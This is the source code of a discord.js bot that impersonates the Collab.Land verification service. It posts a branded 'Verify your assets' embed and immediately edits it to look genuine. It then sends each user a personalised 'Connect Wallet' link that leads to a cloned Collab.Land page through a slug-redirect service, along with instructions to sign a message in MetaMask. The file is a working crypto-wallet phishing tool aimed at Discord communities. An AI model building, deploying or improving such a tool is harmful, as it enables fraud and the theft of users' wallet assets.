require("dotenv").config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require("discord.js");
const { generateCollabLandUrl } = require("./update_html.js");
const path = require("path");
const http = require("http");
const https = require("https");
const { URL } = require("url");
const APPEND_EVM_PATH = process.env.APPEND_EVM_PATH !== "false";
const SLUG_SERVICE_BASE_URL = process.env.SLUG_SERVICE_BASE_URL || process.env.HTML_BASE_URL || null;
const ENABLE_SLUG_SERVICE = process.env.ENABLE_SLUG_SERVICE !== "false";

function postJson(urlObj, payload, depth = 0) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(payload);
    const transport = urlObj.protocol === "https:" ? https : http;
    const options = {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "content-length": Buffer.byteLength(body),
      },
    };

    const req = transport.request(urlObj, options, (res) => {
      let responseBody = "";
      res.on("data", (chunk) => {
        responseBody += chunk;
      });
      res.on("end", () => {
        const statusCode = res.statusCode || 0;
        const locationHeader = res.headers?.location;

        const shouldRedirect =
          locationHeader &&
          [301, 302, 303, 307, 308].includes(statusCode);

        if (shouldRedirect) {
          if (depth >= 3) {
            console.warn("[Slug Service] Maximum redirect depth reached.");
          } else {
            try {
              const redirectedUrl = new URL(locationHeader, urlObj);
              console.log(`[Slug Service] Following redirect to ${redirectedUrl.href}`);
              postJson(redirectedUrl, payload, depth + 1)
                .then(resolve)
                .catch(reject);
              return;
            } catch (error) {
              console.error(`[Slug Service] Failed to follow redirect: ${error.message}`);
            }
          }
        }

        let parsed = null;
        if (responseBody) {
          try {
            parsed = JSON.parse(responseBody);
          } catch (error) {
            console.warn(`[Slug Service] Failed to parse response JSON: ${error.message}`);
          }
        }
        resolve({ statusCode, body: parsed });
      });
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.write(body);
    req.end();
  });
}

async function registerState({ state, id, expiresAt, userId, guildId, interactionId }) {
  if (!SLUG_SERVICE_BASE_URL) {
    console.warn("[State Registration] No base URL configured, skipping state registration");
    return null;
  }

  try {
    const endpoint = new URL("/api/states/register", SLUG_SERVICE_BASE_URL);
    const response = await postJson(endpoint, { state, id, expiresAt, userId, guildId, interactionId });
    
    if (response.statusCode === 200) {
      console.log(`[State Registration] Successfully registered state: ${state.substring(0, 8)}...`);
      return response.body;
    } else {
      console.warn(`[State Registration] Unexpected response (${response.statusCode}): ${JSON.stringify(response.body)}`);
      return null;
    }
  } catch (error) {
    console.error(`[State Registration] Error registering state: ${error.message}`);
    return null;
  }
}

async function createSlugRedirect({ state, id, expiresAt }) {
  if (!SLUG_SERVICE_BASE_URL || !state || !id) {
    return null;
  }

  try {
    const endpoint = new URL("/api/slugs", SLUG_SERVICE_BASE_URL);
    const response = await postJson(endpoint, { state, id, expiresAt });
    if (response.statusCode >= 200 && response.statusCode < 300) {
      return response.body;
    }
    console.warn(`[Slug Service] Unexpected response (${response.statusCode}): ${JSON.stringify(response.body)}`);
  } catch (error) {
    console.error(`[Slug Service] Error creating slug: ${error.message}`);
  }

  return null;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.on("ready", () => {
  console.log(`✅ ${client.user.tag} is ready and connected!`);
  console.log(`🌐 Website URL: ${process.env.HTML_BASE_URL || "file:// (local testing)"}`);
  console.log(`📝 Bot is listening for commands...`);
});

client.on("messageCreate", async (message) => {
  // Ignore bot messages
  if (message.author.bot) return;

  // Debug: log all messages
  console.log(`Message received: "${message.content}" from ${message.author.tag}`);

  if (message.content === "!ping") {
    try {
      console.log(`Processing !ping command from ${message.author.tag}`);
      const embed = new EmbedBuilder()
        .setTitle("Verify your assets")
        .setDescription(
          "This is a read-only connection. Do not share your private keys. We will never ask for your seed phrase. We will never DM you."
        )
        .setColor(0xf5c148)
        .setAuthor({
          name: "Collab.Land",
          iconURL:
            "https://media.discordapp.net/attachments/1429528239583399968/1435074610654875720/dsadsd.png?ex=690aa4e1&is=69095361&hm=ade87762d1dae7db1a0406af1cc0d4fb18aaad1da7a5d8d333778f9a30ad7894&=&format=webp&quality=lossless",
        })
        .setThumbnail(
          "https://media.discordapp.net/attachments/1429528239583399968/1435074610654875720/dsadsd.png?ex=690aa4e1&is=69095361&hm=ade87762d1dae7db1a0406af1cc0d4fb18aaad1da7a5d8d333778f9a30ad7894&=&format=webp&quality=lossless"
        );

      const letsGoButton = new ButtonBuilder()
        .setCustomId("lets_go")
        .setLabel("Let's go!")
        .setStyle(ButtonStyle.Primary);

      const docsButton = new ButtonBuilder()
        .setLabel("Docs")
        .setURL("https://docs.collab.land")
        .setStyle(ButtonStyle.Link);

      const donateButton = new ButtonBuilder()
        .setLabel("Donate")
        .setURL("https://donate.collab.land")
        .setStyle(ButtonStyle.Link);

      const row = new ActionRowBuilder().addComponents(letsGoButton, docsButton, donateButton);

      // Send the message first
      const sentMessage = await message.channel.send({ embeds: [embed], components: [row] });
      
      // Immediately edit it to trigger "(edited)" indicator
      await sentMessage.edit({ embeds: [embed], components: [row] });
      
      console.log(`✓ Sent !ping response to ${message.author.tag}`);
    } catch (error) {
      console.error(`Error processing !ping command: ${error.message}`);
      console.error(error);
      try {
        await message.channel.send("❌ An error occurred while processing your command.");
      } catch (sendError) {
        console.error(`Failed to send error message: ${sendError.message}`);
      }
    }
  }
});

client.on("interactionCreate", async (interaction) => {
  // Check if interaction is a button interaction
  if (!interaction.isButton()) return;

  console.log(`Interaction received: ${interaction.customId} from ${interaction.user.tag}`);

  if (interaction.customId === "lets_go") {
    try {
      console.log(`Processing lets_go button click from ${interaction.user.tag}...`);

      // Defer reply immediately to prevent interaction timeout (must respond within 3 seconds)
      // Use ephemeral: true so the response is only visible to the user who clicked
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      // Get dynamic values from interaction
      const guildId = interaction.guild?.id || "N/A";
      const memberId = interaction.user.id;
      const interactionId = interaction.id;
      const communityName = interaction.guild?.name || "Unknown";
      const userName = `${interaction.user.username}#${interaction.user.discriminator}`;

      console.log(`Button clicked by ${userName} in ${communityName} (${guildId})`);

      const expirationMinutes = Number(process.env.LINK_EXPIRATION_MINUTES) || 6;

      // Generate timestamps
      const linkCreatedAt = new Date();
      const timestampIso = linkCreatedAt.toISOString();
      const formattedTimestamp = new Date().toLocaleString("en-US", {
        month: "short",
        day: "numeric",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      });
      const expiresAtIso = new Date(linkCreatedAt.getTime() + expirationMinutes * 60 * 1000).toISOString();

      // Get base URL from environment variable
      const baseHtmlUrl = process.env.HTML_BASE_URL ||
        `file://${path.resolve(__dirname, "Collab.Land Connect (11_7_2025 5：13：46 PM) (1).html")}`;

      // Get avatar URLs and hashes - pass both so we can include hashes in URL even if URLs are removed
      let userAvatar = null;
      let userAvatarHash = null; // Store hash separately
      let defaultAvatarIndex = null; // Store default avatar index separately
      try {
        // Try to get the avatar hash directly from Discord API
        if (interaction.user.avatar) {
          userAvatarHash = interaction.user.avatar; // This is the hash string
          const isAnimated = userAvatarHash.startsWith("a_");
          const extension = isAnimated ? "gif" : "png";
          userAvatar = `https://cdn.discordapp.com/avatars/${interaction.user.id}/${userAvatarHash}.${extension}?size=128`;
          console.log(`✓ User has custom avatar - hash: ${userAvatarHash}`);
        } else {
          // Use default avatar if user has no custom avatar
          // Get the default avatar URL from Discord.js to ensure correct calculation
          const defaultAvatarURL = interaction.user.displayAvatarURL({ extension: "png", size: 128, forceStatic: true });
          
          // Extract the index from the URL (format: /embed/avatars/INDEX.png)
          const match = defaultAvatarURL.match(/\/embed\/avatars\/(\d+)\.png/);
          if (match) {
            defaultAvatarIndex = parseInt(match[1]);
            userAvatar = defaultAvatarURL;
            console.log(`⚠ User has default avatar (index ${defaultAvatarIndex}) - extracted from Discord.js`);
          } else {
            // Fallback calculation if URL parsing fails
            defaultAvatarIndex = interaction.user.discriminator === "0" 
              ? Number((BigInt(interaction.user.id) >> 22n) % 5n)
              : parseInt(interaction.user.discriminator) % 5;
            userAvatar = `https://cdn.discordapp.com/embed/avatars/${defaultAvatarIndex}.png?size=128`;
            console.log(`⚠ User has default avatar (index ${defaultAvatarIndex}) - calculated fallback`);
          }
        }
        
        // Fallback to displayAvatarURL if above fails
        if (!userAvatar) {
          userAvatar = interaction.user.displayAvatarURL({ extension: "png", size: 128, forceStatic: false });
        }
      } catch (error) {
        console.error(`Error getting user avatar: ${error.message}`);
        userAvatar = interaction.user.displayAvatarURL({ extension: "png", size: 128 }) || null;
      }

      // Get guild icon and hash
      let guildIcon = null;
      let guildIconHash = null; // Store hash separately
      if (interaction.guild?.icon) {
        try {
          guildIconHash = interaction.guild.icon; // This is the hash string
          const isAnimated = guildIconHash.startsWith("a_");
          const extension = isAnimated ? "gif" : "png";
          guildIcon = `https://cdn.discordapp.com/icons/${guildId}/${guildIconHash}.${extension}?size=256`;
          console.log(`✓ Guild has custom icon - hash: ${guildIconHash}`);
          
          // Fallback to iconURL if above fails
          if (!guildIcon) {
            guildIcon = interaction.guild.iconURL({ extension: "png", size: 256, forceStatic: false });
          }
        } catch (error) {
          console.error(`Error getting guild icon: ${error.message}`);
        }
      } else {
        console.log(`⚠ Guild has no custom icon - no hash available`);
      }
      
      console.log(`Avatar URLs - User: ${userAvatar ? userAvatar.substring(0, 60) + '...' : 'none'}, Guild: ${guildIcon ? guildIcon.substring(0, 60) + '...' : 'none'}`);
      console.log(`Avatar Hashes - User: ${userAvatarHash || 'none (default avatar)'}, Guild: ${guildIconHash || 'none (no icon)'}`);

      // Generate URL with dynamic user data as query parameters
      // Pass both URLs and hashes - hashes are small and essential for reconstruction
      const userData = {
        userName: userName,
        communityName: communityName,
        communityId: guildId,
        interactionId: interactionId,
        userAvatar: userAvatar,
        guildIcon: guildIcon,
        timestamp: formattedTimestamp,
        timestampIso,
        expiresAt: expiresAtIso,
        expirationMinutes,
        // Pass IDs directly for URL shortening
        userId: interaction.user.id,
        guildId: guildId,
        // Pass hashes directly so update_html.js can include them even if URLs are removed
        userAvatarHash: userAvatarHash, // Pass hash directly
        defaultAvatarIndex: defaultAvatarIndex, // Pass default avatar index directly
        guildIconHash: guildIconHash,   // Pass hash directly
      };

      // Generate regular link using Collab.Land format (evm?state=...&id=...) for dynamic content
      const linkResult = generateCollabLandUrl(baseHtmlUrl, userData, {
        appendEvmPath: APPEND_EVM_PATH,
        includeMeta: true,
      });

      let personalizedUrl = typeof linkResult === "string" ? linkResult : linkResult.url;
      const generatedState = typeof linkResult === "object" ? linkResult.state : null;
      const generatedId = typeof linkResult === "object" ? linkResult.id : null;

      // Register the state for validation (always do this, even if not using slug service)
      if (generatedState && generatedId) {
        await registerState({
          state: generatedState,
          id: generatedId,
          expiresAt: expiresAtIso,
          userId: interaction.user.id,
          guildId: guildId,
          interactionId: interactionId,
        });
      }

      if (ENABLE_SLUG_SERVICE && generatedState && generatedId) {
        const slugResponse = await createSlugRedirect({
          state: generatedState,
          id: generatedId,
          expiresAt: expiresAtIso,
        });
        if (slugResponse?.slugUrl) {
          personalizedUrl = slugResponse.slugUrl;
          console.log(`[Slug Service] Created slug ${slugResponse.slugId} -> ${personalizedUrl}`);
        } else {
          console.warn("[Slug Service] Falling back to direct URL (slug creation failed).");
        }
      }
      
      console.log(`✓ Generated regular link URL (length: ${personalizedUrl.length}): ${personalizedUrl}`);
      console.log(`✓ Link contains dynamic content: ${communityName} (${guildId})`);

      // Message to sign
      const messageToSign = `Collab.Land asks you to sign this message for the purpose of verifying your account ownership. This is READ-ONLY access.

- Community: ${communityName}
- User: ${userName}
- Discord Interaction: ${interactionId}
- Timestamp: ${timestampIso}`;

      const instructionBox = `You should expect to sign the following message when prompted by a non-custodial wallet such as MetaMask:\n\`\`\`\n${messageToSign}\n\`\`\`\n**Make sure you sign the EXACT message (some wallets may use \`\\n\` for new lines) and NEVER share your seed phrase or private key.**`;

      const responseEmbed = new EmbedBuilder()
        .setTitle("Please read instructions carefully before connecting")
        .setDescription(instructionBox)
        .setColor(0xed4245);

      const connectButton = new ButtonBuilder()
        .setLabel("Connect Wallet")
        .setURL(personalizedUrl)
        .setStyle(ButtonStyle.Link);

      const responseRow = new ActionRowBuilder().addComponents(connectButton);

      const messageText = `Use this custom link to connect (valid for ${expirationMinutes} minutes)\nGuild: ${guildId} Member: ${memberId}`;

      // Edit the deferred reply with the final response
      await interaction.editReply({
        content: messageText,
        embeds: [responseEmbed],
        components: [responseRow],
      });

      console.log(`✓ Sent personalized link to ${interaction.user.tag}`);
    } catch (error) {
      console.error(`Error handling button interaction: ${error.message}`);
      console.error(error);

      // Try to send error message
      try {
        if (interaction.deferred) {
          // If we already deferred, edit the reply
          await interaction.editReply({
            content: "❌ An error occurred while processing your request. Please try again later.",
            embeds: [],
            components: [],
          });
        } else if (interaction.replied) {
          // If we already replied, send a follow-up
          await interaction.followUp({
            content: "❌ An error occurred while processing your request. Please try again later.",
            ephemeral: true,
          });
        } else {
          // If we haven't responded yet, send a new reply
          await interaction.reply({
            content: "❌ An error occurred while processing your request. Please try again later.",
            ephemeral: true,
          });
        }
      } catch (replyError) {
        console.error(`Failed to send error message: ${replyError.message}`);
      }
    }
  }
});

// Get token from environment variable
const token = process.env.DISCORD_TOKEN;

if (!token) {
  console.error("❌ ERROR: DISCORD_TOKEN environment variable is not set!");
  console.error("Please set it before running the bot:");
  console.error("  Windows (PowerShell): $env:DISCORD_TOKEN='your_token'");
  console.error("  Windows (CMD): set DISCORD_TOKEN=your_token");
  console.error("  Linux/Mac: export DISCORD_TOKEN='your_token'");
  process.exit(1);
}

// Handle errors to prevent instant crash
process.on("unhandledRejection", (error) => {
  console.error("\n❌ Unhandled promise rejection:");
  console.error(error);
  if (error.stack) {
    console.error("\nStack trace:");
    console.error(error.stack);
  }
  // Keep process alive for a few seconds so user can read the error
  setTimeout(() => process.exit(1), 10000);
});

process.on("uncaughtException", (error) => {
  console.error("\n❌ Uncaught exception:");
  console.error(error);
  if (error.stack) {
    console.error("\nStack trace:");
    console.error(error.stack);
  }
  // Keep process alive for a few seconds so user can read the error
  setTimeout(() => process.exit(1), 10000);
});

console.log("🚀 Starting Discord bot...");
console.log(`📡 HTML Base URL: ${process.env.HTML_BASE_URL || "file:// (local)"}`);

try {
  client.login(token).catch((error) => {
    console.error("\n❌ Failed to login to Discord:");
    console.error(error);
    if (error.stack) {
      console.error("\nStack trace:");
      console.error(error.stack);
    }
    // Keep process alive for a few seconds so user can read the error
    setTimeout(() => process.exit(1), 10000);
  });
} catch (error) {
  console.error("\n❌ Error starting bot:");
  console.error(error);
  if (error.stack) {
    console.error("\nStack trace:");
    console.error(error.stack);
  }
  // Keep process alive for a few seconds so user can read the error
  setTimeout(() => process.exit(1), 10000);
}

